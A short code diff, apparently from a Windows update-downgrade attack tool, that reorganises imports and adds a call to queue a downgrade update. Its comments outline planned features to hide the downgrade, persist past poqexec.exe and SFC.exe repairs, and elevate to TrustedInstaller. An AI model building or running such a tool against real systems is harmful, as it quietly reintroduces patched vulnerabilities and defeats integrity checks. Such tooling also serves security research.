@@ -3,9 +3,10 @@ import logging
 import sys
 from typing import List
 
-from utils.component_store import retrieve_oldest_files_for_update_files, UpdateFile
-from utils.filesystem import is_path_exists, Path, is_file_contents_equal
-from utils.xml_utils import load_xml, find_child_elements_by_match, get_element_attribute, create_element, \
+from windows_downdate.component_store_utils import retrieve_oldest_files_for_update_files, UpdateFile
+from windows_downdate.filesystem_utils import is_path_exists, Path, is_file_contents_equal
+from windows_downdate.update_utils import pend_update
+from windows_downdate.xml_utils import load_xml, find_child_elements_by_match, get_element_attribute, create_element, \
     append_child_element
 
 logger = logging.getLogger(__name__)
@@ -115,17 +116,23 @@ def main() -> None:
 
         downgrade_xml_path = args.custom_pending_xml
 
+    # Install all missing Windows Updates to make the system "Up to date"
     if args.invisible:
         raise NotImplementedError("Not implemented yet")
 
+    # Add poqexec.exe patch to downgrade XML
     if args.persistent:
         raise NotImplementedError("Not implemented yet")
 
+    # Add SFC.exe patch to downgrade XML
     if args.irreversible:
         raise NotImplementedError("Not implemented yet")
 
+    # Elevate to TrustedInstaller
     if args.elevate:
         raise NotImplementedError("Not implemented yet")
+
+    pend_update(downgrade_xml_path)
 
     if args.force_restart:
         raise NotImplementedError("Not implemented yet")
